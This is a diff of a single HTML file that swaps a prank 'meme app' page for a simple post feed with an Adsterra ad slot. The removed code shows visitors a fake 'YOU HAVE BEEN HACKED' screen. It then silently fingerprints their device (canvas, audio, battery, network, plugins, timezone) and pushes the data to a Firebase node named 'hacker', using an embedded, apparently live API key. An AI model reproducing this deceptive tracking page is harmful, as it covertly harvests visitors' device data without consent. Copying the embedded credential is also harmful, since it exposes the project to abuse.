@@ -1,341 +1,61 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Totally Normal App</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Post Feed with Adsterra Ad</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-    body, html {
-      margin: 0; padding: 0; height: 100%;
-      background: #0a0f14;
-      color: #0f0;
-      font-family: 'Share Tech Mono', monospace;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      overflow: hidden;
-      user-select: none;
+    body {
+      font-family: system-ui, sans-serif;
+      margin: 0;
+      padding: 2rem;
+      background: #f9f9f9;
     }
-
-    #app {
-      z-index: 10;
+    .post {
+      background: #fff;
+      padding: 1.2rem;
+      margin-bottom: 1.2rem;
+      border-radius: 12px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+    }
+    .post h2 {
+      font-size: 1.2rem;
+      margin: 0 0 0.5rem;
+    }
+    .post p {
+      margin: 0;
+      color: #444;
+    }
+    .ad-container {
+      margin: 2rem 0;
       text-align: center;
-      max-width: 600px;
-      padding: 1rem 2rem;
-      border: 2px solid #0f0;
-      border-radius: 8px;
-      background: rgba(0,255,0,0.07);
-      box-shadow: 0 0 15px #0f0;
-      cursor: default;
-    }
-
-    h1 {
-      font-size: 2.5rem;
-      margin-bottom: 1rem;
-      text-shadow: 0 0 10px #0f0;
-    }
-
-    p {
-      font-size: 1.1rem;
-      margin-bottom: 2rem;
-      color: #7fff7f;
-      text-shadow: 0 0 5px #073a07;
-    }
-
-    button {
-      background: transparent;
-      border: 3px solid #0f0;
-      padding: 1rem 3rem;
-      font-size: 1.4rem;
-      color: #0f0;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background 0.3s ease, color 0.3s ease;
-    }
-
-    button:hover {
-      background: #0f0;
-      color: #000;
-    }
-
-    pre#output {
-      margin-top: 1.5rem;
-      background: rgba(0,255,0,0.1);
-      border: 1px solid #0f0;
-      border-radius: 6px;
-      padding: 1rem 1.5rem;
-      max-height: 60vh;
-      overflow-y: auto;
-      white-space: pre-wrap;
-      font-size: 1rem;
-      user-select: text;
-    }
-
-    /* FULLSCREEN VIRUS EFFECT */
-
-    #virusOverlay {
-      position: fixed;
-      inset: 0;
-      background: black;
-      color: #ff0000;
-      font-family: 'Share Tech Mono', monospace;
-      font-size: 2rem;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-      text-align: center;
-      user-select: none;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.5s ease;
-    }
-
-    #virusOverlay.active {
-      opacity: 1;
-      pointer-events: all;
-    }
-
-    #virusText {
-      text-shadow:
-        0 0 5px #ff0000,
-        0 0 10px #ff0000,
-        0 0 20px #ff0000,
-        0 0 40px #ff0000;
-      animation: flicker 1.5s infinite;
-      margin-bottom: 2rem;
-    }
-
-    @keyframes flicker {
-      0%, 100% {opacity: 1;}
-      50% {opacity: 0.4;}
-    }
-
-    #loadingBarContainer {
-      width: 70%;
-      height: 20px;
-      background: #220000;
-      border: 2px solid #ff0000;
-      border-radius: 10px;
-      overflow: hidden;
-      box-shadow: 0 0 15px #ff0000 inset;
-    }
-
-    #loadingBar {
-      width: 0%;
-      height: 100%;
-      background: #ff0000;
-      animation: load 5s linear forwards;
-      box-shadow: 0 0 15px #ff0000;
-    }
-
-    @keyframes load {
-      to { width: 100%; }
     }
   </style>
 </head>
 <body>
 
-<div id="app">
-  <h1>FUNNY MEME APP</h1>
-  <p>Click the button below to continue.</p>
-  <button id="startBtn">Click Me</button>
-  <pre id="output" style="display:none;">Loading info...</pre>
-</div>
+  <h1>🔥 Latest Posts</h1>
 
-<div id="virusOverlay" aria-hidden="true">
-  <div id="virusText">!!! YOU HAVE BEEN HACKED !!!</div>
-  <div id="loadingBarContainer"><div id="loadingBar"></div></div>
-</div>
+  <!-- 10 Random Posts, Ad inserted after 5th -->
+  <div class="post"><h2>Post 1</h2><p>This is some content for post 1.</p></div>
+  <div class="post"><h2>Post 2</h2><p>This is some content for post 2.</p></div>
+  <div class="post"><h2>Post 3</h2><p>This is some content for post 3.</p></div>
+  <div class="post"><h2>Post 4</h2><p>This is some content for post 4.</p></div>
+  <div class="post"><h2>Post 5</h2><p>This is some content for post 5.</p></div>
 
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
-  import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";
-  import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-analytics.js";
+  <!-- 🔥 Adsterra Native Ad -->
+  <div class="ad-container">
+    <script async="async" data-cfasync="false" 
+      src="https://native.adsterra.com/native/native.js" 
+      data-adspot-id="4973356">
+    </script>
+  </div>
 
-  // Firebase config (from your snippet)
-  const firebaseConfig = {
-    apiKey: "AIzaSyDFHskUWiyHhZke3KT9kkOtFI_gPsKfiGo",
-    authDomain: "itzhoyoo-f9f7e.firebaseapp.com",
-    databaseURL: "https://itzhoyoo-f9f7e-default-rtdb.firebaseio.com",
-    projectId: "itzhoyoo-f9f7e",
-    storageBucket: "itzhoyoo-f9f7e.firebasestorage.app",
-    messagingSenderId: "1094792075584",
-    appId: "1:1094792075584:web:d49e9c3f899d3cd31082a5",
-    measurementId: "G-LLT6F9WRKH"
-  };
-
-  const app = initializeApp(firebaseConfig);
-  const analytics = getAnalytics(app);
-  const db = getDatabase(app);
-
-  const startBtn = document.getElementById('startBtn');
-  const virusOverlay = document.getElementById('virusOverlay');
-  const output = document.getElementById('output');
-  const appDiv = document.getElementById('app');
-
-  async function getBatteryInfo() {
-    if (!navigator.getBattery) return 'Not supported';
-    try {
-      const battery = await navigator.getBattery();
-      return `Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging}`;
-    } catch {
-      return 'Battery info unavailable';
-    }
-  }
-
-  function getNetworkInfo() {
-    if (!navigator.connection) return 'Not supported';
-    const c = navigator.connection;
-    return `Type: ${c.effectiveType}, Downlink: ${c.downlink}Mb/s, RTT: ${c.rtt}ms`;
-  }
-
-  function supportsTouch() {
-    return ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) ? 'Yes' : 'No';
-  }
-
-  function canvasFingerprint() {
-    try {
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      ctx.textBaseline = "top";
-      ctx.font = "14px 'Share Tech Mono', monospace";
-      ctx.textBaseline = "alphabetic";
-      ctx.fillStyle = "#0f0";
-      ctx.fillRect(2, 2, 100, 30);
-      ctx.fillStyle = "#000";
-      ctx.fillText("HackerVibes", 4, 20);
-      const data = canvas.toDataURL();
-      let hash = 0;
-      for (let i = 0; i < data.length; i++) {
-        hash = ((hash << 5) - hash) + data.charCodeAt(i);
-        hash |= 0;
-      }
-      return hash.toString(16);
-    } catch {
-      return 'Failed';
-    }
-  }
-
-  function getPerformanceTiming() {
-    if (!performance || !performance.timing) return 'Not supported';
-    const t = performance.timing;
-    return `Load time: ${t.loadEventEnd - t.navigationStart} ms\nDOM Ready: ${t.domContentLoadedEventEnd - t.navigationStart} ms`;
-  }
-
-  function getPlugins() {
-    if (!navigator.plugins) return 'Not supported';
-    if (navigator.plugins.length === 0) return 'None detected';
-    return Array.from(navigator.plugins).map(p => p.name).join(', ');
-  }
-
-  function storageEstimate() {
-    if (!navigator.storage || !navigator.storage.estimate) return Promise.resolve('Not supported');
-    return navigator.storage.estimate().then(estimate => {
-      const quotaMB = (estimate.quota / (1024*1024)).toFixed(2);
-      const usageMB = (estimate.usage / (1024*1024)).toFixed(2);
-      return `Quota: ${quotaMB} MB\nUsage: ${usageMB} MB`;
-    }).catch(() => 'Storage estimate unavailable');
-  }
-
-  function audioFingerprint() {
-    try {
-      const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
-      if (!AudioContext) return 'Not supported';
-      const context = new AudioContext(1, 44100, 44100);
-      const oscillator = context.createOscillator();
-      oscillator.type = 'triangle';
-      oscillator.frequency.setValueAtTime(10000, context.currentTime);
-      const analyser = context.createAnalyser();
-      const gainNode = context.createGain();
-      gainNode.gain.setValueAtTime(0, context.currentTime);
-      oscillator.connect(analyser);
-      analyser.connect(gainNode);
-      gainNode.connect(context.destination);
-      oscillator.start(0);
-      context.startRendering();
-      oscillator.stop(0);
-      return 'Available';
-    } catch {
-      return 'Failed';
-    }
-  }
-async function collectUserInfo() {
-    const battery = await getBatteryInfo();
-    const network = getNetworkInfo();
-    const touch = supportsTouch();
-    const canvasFP = canvasFingerprint();
-    const perf = getPerformanceTiming();
-    const plugins = getPlugins();
-    const storage = await storageEstimate();
-    const audioFP = audioFingerprint();
-
-    return {
-      battery,
-      network,
-      touch,
-      canvasFP,
-      perf,
-      plugins,
-      storage,
-      audioFP,
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      screenResolution: `${window.screen.width}x${window.screen.height}`,
-    };
-  }
-
-  async function saveToFirebase(data) {
-    try {
-      const hackerRef = ref(db, 'hacker');
-      await push(hackerRef, data);
-      console.log('User info saved to Firebase hacker node.');
-    } catch (e) {
-      console.error('Failed to save data:', e);
-    }
-  }
-
-  function showVirusOverlay() {
-    virusOverlay.classList.add('active');
-  }
-
-  function hideAppShowOutput(infoText) {
-    appDiv.style.display = 'none';
-    output.style.display = 'block';
-    output.textContent = infoText;
-  }
-
-  startBtn.addEventListener('click', async () => {
-    showVirusOverlay();
-
-    // Wait for loading bar animation (5 seconds)
-    await new Promise(resolve => {
-      const loadingBar = document.getElementById('loadingBar');
-      loadingBar.addEventListener('animationend', () => resolve(), { once: true });
-    });
-
-    // Collect user info
-    const info = await collectUserInfo();
-
-    // Save data silently
-    saveToFirebase(info);
-
-    // Format info to pretty print
-    let infoText = '=== SYSTEM INFO DUMP ===\n\n';
-    for (const [key, val] of Object.entries(info)) {
-      infoText += `${key}:\n${typeof val === 'object' ? JSON.stringify(val, null, 2) : val}\n\n`;
-    }
-
-    // Hide virus overlay and show data
-    virusOverlay.classList.remove('active');
-    hideAppShowOutput(infoText);
-  });
-</script>
+  <div class="post"><h2>Post 6</h2><p>This is some content for post 6.</p></div>
+  <div class="post"><h2>Post 7</h2><p>This is some content for post 7.</p></div>
+  <div class="post"><h2>Post 8</h2><p>This is some content for post 8.</p></div>
+  <div class="post"><h2>Post 9</h2><p>This is some content for post 9.</p></div>
+  <div class="post"><h2>Post 10</h2><p>This is some content for post 10.</p></div>
 
 </body>
 </html>
